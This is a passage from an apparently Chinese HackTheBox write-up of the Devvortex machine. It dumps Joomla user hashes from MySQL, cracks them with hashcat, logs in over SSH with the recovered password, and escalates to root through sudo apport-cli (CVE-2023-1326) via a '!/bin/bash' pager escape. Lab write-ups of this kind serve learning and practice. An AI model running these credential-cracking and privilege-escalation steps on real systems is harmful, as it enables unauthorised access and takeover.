+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; describe sd4fg_users;</span><br><span class="line">+---------------+---------------+------+-----+---------+----------------+</span><br><span class="line">| Field         | Type          | Null | Key | Default | Extra          |</span><br><span class="line">+---------------+---------------+------+-----+---------+----------------+</span><br><span class="line">| id            | int           | NO   | PRI | NULL    | auto_increment |</span><br><span class="line">| name          | varchar(400)  | NO   | MUL |         |                |</span><br><span class="line">| username      | varchar(150)  | NO   | UNI |         |                |</span><br><span class="line">| email         | varchar(100)  | NO   | MUL |         |                |</span><br><span class="line">| password      | varchar(100)  | NO   |     |         |                |</span><br><span class="line">| block         | tinyint       | NO   | MUL | 0       |                |</span><br><span class="line">| sendEmail     | tinyint       | YES  |     | 0       |                |</span><br><span class="line">| registerDate  | datetime      | NO   |     | NULL    |                |</span><br><span class="line">| lastvisitDate | datetime      | YES  |     | NULL    |                |</span><br><span class="line">| activation    | varchar(100)  | NO   |     |         |                |</span><br><span class="line">| params        | text          | NO   |     | NULL    |                |</span><br><span class="line">| lastResetTime | datetime      | YES  |     | NULL    |                |</span><br><span class="line">| resetCount    | int           | NO   |     | 0       |                |</span><br><span class="line">| otpKey        | varchar(1000) | NO   |     |         |                |</span><br><span class="line">| otep          | varchar(1000) | NO   |     |         |                |</span><br><span class="line">| requireReset  | tinyint       | NO   |     | 0       |                |</span><br><span class="line">| authProvider  | varchar(100)  | NO   |     |         |                |</span><br><span class="line">+---------------+---------------+------+-----+---------+----------------+</span><br><span class="line">17 rows in set (0.01 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select name,username,password from sd4fg_users;</span><br><span class="line">+------------+----------+--------------------------------------------------------------+</span><br><span class="line">| name       | username | password                                                     |</span><br><span class="line">+------------+----------+--------------------------------------------------------------+</span><br><span class="line">| lewis      | lewis    | $2y$10$6V52x.SD8Xc7hNlVwUTrI.ax4BIAYuhVBMVvnYWRceBmy8XdEzm1u |</span><br><span class="line">| logan paul | logan    | $2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12 |</span><br><span class="line">+------------+----------+--------------------------------------------------------------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+
+<p>这条logan paul的记录比较有意思 应该可以复用于ssh连接了 现在首要是撞出哈希</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">❯ hashcat logan ../Documents/Red/SecDictionary/PasswordDic/弱口令字典/rockyou-top15000.txt --user -m 3200</span><br><span class="line">···</span><br><span class="line">$2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12:tequieromucho</span><br></pre></td></tr></table></figure>
+
+<p>当然反过来去撞lewis的密码也是可以的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">❯ cat sqlpass</span><br><span class="line">P4ntherg0t1n5r3c0n##</span><br><span class="line">❯ hashcat logan  sqlpass --user -m 3200</span><br><span class="line">...</span><br><span class="line">$2y$10$6V52x.SD8Xc7hNlVwUTrI.ax4BIAYuhVBMVvnYWRceBmy8XdEzm1u:P4ntherg0t1n5r3c0n##</span><br></pre></td></tr></table></figure>
+
+<h2 id="SSH"><a href="#SSH" class="headerlink" title="SSH"></a>SSH</h2><p>ok那就用logan:tequieromucho进行ssh登陆 成功拿到user.txt</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">❯ ssh logan@10.10.11.242</span><br><span class="line">...</span><br><span class="line">logan@devvortex:~$ cat /home/logan/user.txt</span><br><span class="line">7255c0f90e316ba7041e99fa4732413c</span><br></pre></td></tr></table></figure>
+
+<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>使用sudo -l之后发现可以用SUID提权 发现可以利用CVE-2023-1326</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">logan@devvortex:~$ sudo -l</span><br><span class="line">[sudo] password for logan:</span><br><span class="line">Matching Defaults entries for logan on devvortex:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line"></span><br><span class="line">User logan may run the following commands on devvortex:</span><br><span class="line">    (ALL : ALL) /usr/bin/apport-cli</span><br></pre></td></tr></table></figure>
+
+<p>apport为处理崩溃程序 若还没崩溃文件那可以先制造一个</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">logan@devvortex:/var/crash$ sleep 20 &amp;</span><br><span class="line">[1] 2761</span><br><span class="line">logan@devvortex:/var/crash$ kill -ABRT 2761</span><br><span class="line">logan@devvortex:/var/crash$ ls</span><br><span class="line">_usr_bin_sleep.1000.crash</span><br><span class="line">[1]+  Aborted                 (core dumped) sleep 20</span><br></pre></td></tr></table></figure>
+
+<p>获得到崩溃文件之后 就可以进行SUID啦</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">logan@devvortex: sudo /usr/bin/apport-cli -c /var/crash/_usr_bin_sleep.1000.crash</span><br><span class="line">press V (view report)</span><br><span class="line">!/bin/bash(直接输入 不用管屏幕显示的什么)</span><br><span class="line"></span><br><span class="line">root@devvortex:/var/crash# cd /root</span><br><span class="line">root@devvortex:~# ls</span><br><span class="line">root.txt</span><br><span class="line">root@devvortex:~# cat root.txt</span><br><span class="line">7acd9379429470e54caf82726290e8ff</span><br></pre></td></tr></table></figure>
+    </article>
+    <!-- license -->
+        <div class="license-wrapper">
+            <p>Author：<a href="http://dawoxiansigema.github.io">Xu Haoxiang</a>
+            <p>Link：<a href="http://dawoxiansigema.github.io/2025/09/15/Devvortex/">http://dawoxiansigema.github.io/2025/09/15/Devvortex/</a>
+            <p>Publish date：<a href="http://dawoxiansigema.github.io/2025/09/15/Devvortex/">September 15th 2025, 11:35:23 pm</a>
+            <p>Update date：<a href="http://dawoxiansigema.github.io/2025/09/15/Devvortex/">September 16th 2025, 5:31:55 pm</a>
+            <p>License：本文采用<a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
+        </div>
+    <!-- paginator -->
+    <ul class="post-paginator">
+        <li class="next">
+        </li>
+        <li class="previous">
+                <div class="prevSlogan">Previous Post</div>
+                <a href="/2025/09/06/Msfvenom/" title="Msfvenom">
+                    <div class="prevTitle">Msfvenom</div>
+                </a>
+        </li>
+    </ul>
+    <!-- comment -->
+        <div class="post-comment">
+            <!-- 来必力 City 版安装代码 -->
+
+            
+            
+            
+            <!-- utteranc评论 -->
+
+            <!-- partial('_partial/comment/changyan') -->
+            <!--PC版-->
+
+            
+            
+            
+        </div>
+    <!-- timeliness note -->
+    <!-- idea from: https://hexo.fluid-dev.com/posts/hexo-injector/#%E6%96%87%E7%AB%A0%E6%97%B6%E6%95%88%E6%80%A7%E6%8F%90%E7%A4%BA -->
+    <!-- Mathjax -->
+</main>
+
+                <!-- profile -->
+            </div>
+            <footer class="footer footer-unloaded">
+    <!-- social  -->
+        <div class="social">
+                            <a href="mailto:2071970042@qq.com" class="iconfont-archer email" title="email" ></a>
+                <a href="//github.com/Dawoxiansigema" class="iconfont-archer github" target="_blank" title="github"></a>
+
+        </div>
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
+    </div>
+    <!-- website approve for Chinese user -->
+    <!-- 不蒜子  -->
+        <div class="busuanzi-container">
+                <span id="busuanzi_container_site_pv">PV: <span id="busuanzi_value_site_pv"></span> :)</span>
+        </div>
+</footer>
+
+        </div>
+        <!-- toc -->
+            <div class="toc-wrapper toc-wrapper-loding" style=    top:50vh;
+>
+                <div class="toc-catalog">
+                    <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+                </div>
+                <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="toc-number">1.</span> <span class="toc-text">信息搜集</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%9D%80%E6%89%8B"><span class="toc-number">2.</span> <span class="toc-text">着手</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2023-23752"><span class="toc-number">2.1.</span> <span class="toc-text">CVE-2023-23752</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Templates%E4%BF%AE%E6%94%B9"><span class="toc-number">2.2.</span> <span class="toc-text">Templates修改</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#logan%E7%99%BB%E9%99%86"><span class="toc-number">3.</span> <span class="toc-text">logan登陆</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Hashcat"><span class="toc-number">3.1.</span> <span class="toc-text">Hashcat</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SSH"><span class="toc-number">3.2.</span> <span class="toc-text">SSH</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-number">4.</span> <span class="toc-text">提权</span></a></li></ol>
+            </div>
+        <!-- sidebar -->
+        <div class="sidebar sidebar-hide">
+    <ul class="sidebar-tabs sidebar-tabs-active-0">
+        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
+        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
+        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
+    </ul>
+    <div class="sidebar-content sidebar-content-show-archive">
+        <div class="sidebar-panel-archives">
+    <!-- 在 ejs 中将 archive 按照时间排序 -->
+        
+        
+        
+        
+    <div class="total-and-search">
+        <div class="total-archive">
+        Total : 4
+        </div>
+        <!-- search  -->
+    </div>
+    <div class="post-archive">
+            <div class="archive-year"> 2025 </div>
+            <ul class="year-list">
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/15</span>
+            <a class="archive-post-title" href="/2025/09/15/Devvortex/">Devvortex</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/06</span>
+            <a class="archive-post-title" href="/2025/09/06/Msfvenom/">Msfvenom</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/06</span>
+            <a class="archive-post-title" href="/2025/09/06/SUID/">SUID</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/04</span>
+            <a class="archive-post-title" href="/2025/09/04/GoodGames/">GoodGames</a>
+        </li>
+            </ul>
+    </div>
+</div>
+
+        <div class="sidebar-panel-tags">
+    <div class="sidebar-tags-name">
+            <span class="sidebar-tag-name" data-tags="HTB">
+                <span class="iconfont-archer">&#xe606;</span>
+                HTB
+            </span>
+            <span class="sidebar-tag-name" data-tags="工具">
+                <span class="iconfont-archer">&#xe606;</span>
+                工具
+            </span>
+            <span class="sidebar-tag-name" data-tags="提权">
+                <span class="iconfont-archer">&#xe606;</span>
+                提权
+            </span>
+    </div>
+    <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
+    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
+        缺失模块，请参考主题文档进行安装配置：https://github.com/fi3ework/hexo-theme-archer#%E5%AE%89%E8%A3%85%E4%B8%BB%E9%A2%98
+    </div> 
+    <div class="sidebar-tags-list"></div>
+</div>
+
+        <div class="sidebar-panel-categories">
+    <div class="sidebar-categories-name">
+    </div>
+    <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
+    <div class="sidebar-categories-list"></div>
+</div>
+
+    </div>
+</div>
+
+        <!-- site-meta -->
+        <script>
+    var siteMetaRoot = "/"
+    if (siteMetaRoot === "undefined") {
+        siteMetaRoot = '/'
+    }
+    var siteMeta = {
+        url: "http://dawoxiansigema.github.io",
+        root: siteMetaRoot,
+        author: "Xu Haoxiang"
+    }
+</script>
+
+        <!-- import experimental options here -->
+        <!-- Custom Font -->
+
+        <!-- main func -->
+        <script src="/scripts/main.js"></script>
+        <!-- fancybox -->
+        <script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.36/dist/fancybox/fancybox.umd.js" onload="window.Fancybox.bind('[data-fancybox]')" defer></script>
+        <!-- algolia -->
+        <!-- busuanzi -->
+            <script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script>
+        <!-- async load share.js -->
+            <script src="/scripts/share.js" async></script>
+        <!-- mermaid -->
+    </body>
+</html>
